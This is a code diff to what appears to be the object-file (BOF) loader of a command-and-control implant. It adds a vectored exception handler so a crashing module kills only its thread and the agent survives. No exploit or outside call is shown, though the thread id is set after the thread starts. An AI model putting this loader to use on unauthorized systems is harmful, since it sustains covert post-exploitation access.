@@ -327,6 +327,13 @@ static const char *get_symbol_name(const COFF_SYMBOL *sym,
 }
 
 /* ─── BOF thread wrapper for crash isolation ─── */
+/*
+ * An unhandled exception in ANY thread terminates the entire process
+ * by default on Windows. CreateThread alone does NOT isolate crashes.
+ * We use a Vectored Exception Handler (VEH) that catches exceptions
+ * from the BOF thread and terminates only that thread, keeping the
+ * agent alive.
+ */
 
 typedef void (__cdecl *BofEntryFunc)(char *args, int args_len);
 
@@ -335,6 +342,28 @@ typedef struct {
     char        *args;
     int          args_len;
 } BOF_THREAD_CTX;
+
+/* Globals for VEH ↔ thread communication */
+static volatile DWORD  g_bof_thread_id      = 0;
+static volatile DWORD  g_bof_exception_code  = 0;
+static volatile PVOID  g_bof_exception_addr  = NULL;
+static volatile LONG   g_bof_crashed         = 0;
+
+static LONG CALLBACK bof_veh_handler(PEXCEPTION_POINTERS ep) {
+    /* Only intercept exceptions from the BOF thread */
+    if (GetCurrentThreadId() != g_bof_thread_id)
+        return EXCEPTION_CONTINUE_SEARCH;
+
+    g_bof_exception_code = ep->ExceptionRecord->ExceptionCode;
+    g_bof_exception_addr = ep->ExceptionRecord->ExceptionAddress;
+    InterlockedExchange(&g_bof_crashed, 1);
+
+    /* Kill ONLY this thread. The exit code = exception code so
+     * the main thread can read it via GetExitCodeThread. */
+    ExitThread(ep->ExceptionRecord->ExceptionCode);
+
+    return EXCEPTION_CONTINUE_EXECUTION; /* unreachable */
+}
 
 static DWORD WINAPI bof_thread_proc(LPVOID param) {
     BOF_THREAD_CTX *ctx = (BOF_THREAD_CTX *)param;
@@ -741,39 +770,56 @@ BOOL coff_load_and_execute(
     }
 
     /* Call the BOF entry point in a separate thread for crash isolation.
-     * If the BOF triggers an access violation or other fatal exception,
-     * only the worker thread dies — the agent survives. */
+     * A VEH catches exceptions from the BOF thread and calls ExitThread
+     * so only the worker thread dies — the agent process survives. */
     {
         BOF_THREAD_CTX tctx;
         tctx.entry    = entry;
         tctx.args     = (char *)arg_data;
         tctx.args_len = (int)arg_len;
 
-        HANDLE hThread = CreateThread(NULL, 0, bof_thread_proc, &tctx, 0, NULL);
+        /* Reset crash state */
+        g_bof_crashed        = 0;
+        g_bof_exception_code = 0;
+        g_bof_exception_addr = NULL;
+        g_bof_thread_id      = 0;
+
+        /* Register VEH BEFORE creating the thread */
+        PVOID veh = AddVectoredExceptionHandler(1, bof_veh_handler);
+
+        DWORD tid = 0;
+        HANDLE hThread = CreateThread(NULL, 0, bof_thread_proc, &tctx, 0, &tid);
         if (hThread) {
+            g_bof_thread_id = tid;
+
             DWORD waitRet = WaitForSingleObject(hThread, 300000); /* 5 min timeout */
             DWORD exitCode = 0;
             GetExitCodeThread(hThread, &exitCode);
 
             if (waitRet == WAIT_TIMEOUT || exitCode == STILL_ACTIVE) {
-                /* Timed out — kill the thread */
                 TerminateThread(hThread, 1);
                 CloseHandle(hThread);
                 BeaconPrintf(0x0d, "[!] COFF: BOF timed out after 300s — thread terminated\n");
             } else {
                 CloseHandle(hThread);
-                if (exitCode != 0) {
-                    /* Thread crashed with an exception code */
+                if (g_bof_crashed) {
                     BeaconPrintf(0x0d,
-                        "[!] COFF: BOF crashed with exception 0x%08X\n", exitCode);
+                        "[!] COFF: BOF crashed with exception 0x%08X at address %p\n",
+                        g_bof_exception_code, g_bof_exception_addr);
+                } else if (exitCode != 0) {
+                    BeaconPrintf(0x0d,
+                        "[!] COFF: BOF thread exited with code 0x%08X\n", exitCode);
                 }
             }
         } else {
-            /* CreateThread failed — fall back to direct call (risky) */
             BeaconPrintf(0x0d, "[!] COFF: CreateThread failed (%u), running BOF inline\n",
                          GetLastError());
             entry((char *)arg_data, (int)arg_len);
         }
+
+        /* Remove VEH after BOF completes */
+        if (veh) RemoveVectoredExceptionHandler(veh);
+        g_bof_thread_id = 0;
     }
 
     /* ─── Step 10: Collect output and cleanup ─── */
